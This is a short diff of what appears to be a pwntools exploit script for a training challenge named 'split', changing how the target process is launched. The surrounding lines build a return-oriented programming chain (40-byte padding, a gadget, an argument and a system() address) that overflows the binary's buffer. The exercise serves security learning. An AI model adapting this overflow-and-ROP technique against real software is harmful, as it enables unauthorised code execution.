@@ -14,7 +14,7 @@ systemCall = p64(systemCallAddr)
 
 crap = "A"* 40
 
-io = process("./split")
+io = e.process()
 
 
 io.sendline(crap + ropGadget + rdiContent + systemCall)
